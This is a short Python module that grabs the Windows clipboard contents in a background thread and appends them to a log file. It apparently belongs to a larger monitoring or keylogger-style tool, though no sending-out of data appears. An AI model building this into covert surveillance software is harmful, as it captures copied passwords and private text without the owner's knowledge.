import win32clipboard
from threading import Thread
from vars import *
def grab_clipboard():
    with open(f'{clipboard_path}\\{clipboard_information}',"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data =  win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f'Clipboard Data:\n{pasted_data}\n')
        except:
            f.write("Clipboard Could not be copied")


def copy_clipboard():
    clip_thread = Thread(target=grab_clipboard)
    clip_thread.start()

